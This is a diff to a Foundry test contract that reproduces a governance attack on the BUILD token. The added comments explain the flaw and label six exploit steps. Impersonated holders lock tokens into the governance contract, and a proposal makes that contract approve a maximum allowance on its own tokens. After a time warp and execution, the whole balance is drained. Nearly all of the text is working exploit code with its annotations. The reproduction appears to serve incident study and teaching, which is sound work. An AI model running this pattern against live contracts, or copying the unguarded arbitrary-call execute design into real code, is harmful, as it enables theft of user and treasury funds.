@@ -15,26 +15,31 @@ contract ContractTest is Test {
     }
 
     function test() public {
+        // @VULNERABILITY: Governance (0x5A6eBeB61A80B2a2a5e0B4D893D731358d888583) escrows full voting token balances into itself via lockVotes on propose/vote (Governance.sol:209-215), holds low thresholds (proposalThreshold=100e18, quorumVotes=5000e18 at L143-146), and execute() blindly does arbitrary _target.call(_data) (L254-270) allowing a proposal to target the BUILD token itself with approve(max) to drain the treasury it custodied. No target whitelist, no timelock guardian.
         cheat.prank(0x562680a4dC50ed2f14d75BF31f494cfE0b8D10a1);
         build.transfer(address(this), 101_529_401_443_281_484_977);
         emit log_named_uint("Befre proposing, BUILD balance of attacker:", build.balanceOf(address(this)));
         build.approve(address(BuildGovernance), type(uint256).max);
 
+        // @EXPLOIT_STEP 1: Prank a holder and transfer ~101.53 BUILD (just above proposalThreshold) to this contract so it can create a proposal.
         BuildGovernance.propose(
             0x6e36556B3ee5Aa28Def2a8EC3DAe30eC2B208739,
             0,
             hex"095ea7b3000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
         );
+        // @EXPLOIT_STEP 2: Submit propose(BUILD_token, 0, approve(attacker_spender, max_uint)) — the lockVotes modifier (on propose) immediately transferFrom's the attacker's entire BUILD balance into the Governance contract, making Governance the custodian; the proposal hash is recorded.
         emit log_named_uint("After proposing, BUILD balance of attacker:", build.balanceOf(address(this)));
         emit log_named_uint("BUILD balance of BuildGovernance contract:", build.balanceOf(address(BuildGovernance)));
         cheat.prank(0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002);
         build.approve(address(BuildGovernance), type(uint256).max);
         cheat.prank(0xf41c13f4E2f750408fC6eb5cF0E34225D52E7002);
         BuildGovernance.vote(8, true);
+        // @EXPLOIT_STEP 3: Prank a large BUILD holder (whale) to vote FOR on proposal 8 — lockVotes pulls ~321k BUILD into Governance (pushing total held >> quorum) and records the forVotes.
         emit log_named_int("Proposal count:", BuildGovernance.proposalCount());
         emit log_named_uint("Proposal state:", BuildGovernance.state(8));
 
         cheat.warp(1_655_436_437);
+        // @EXPLOIT_STEP 4: Warp time forward past the votingPeriod + executionPeriod so that state(8) transitions from Active (0) to ReadyForExecution (3) based on time + quorum check only.
         emit log_named_uint("After 2 days, Proposal state:", BuildGovernance.state(8));
         BuildGovernance.execute(
             8,
@@ -42,7 +47,9 @@ contract ContractTest is Test {
             0,
             hex"095ea7b3000000000000000000000000b4c79dab8f259c7aee6e5b2aa729821864227e84ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
         );
+        // @EXPLOIT_STEP 5: Call execute using the exact (target, value, data) from the proposal — Governance performs BUILD.approve(spender, max) where msg.sender inside the token is the Governance contract itself (no restrictions on target/calldata).
         build.transferFrom(address(BuildGovernance), address(this), build.balanceOf(address(BuildGovernance)));
+        // @EXPLOIT_STEP 6: Use the newly-granted max allowance to transferFrom the entire BUILD balance that Governance accumulated (via lockVotes from attacker seed + whale voter) out of the contract.
         emit log_named_uint("After exploiting, BUILD balance of attacker:", build.balanceOf(address(this)));
     }
 }
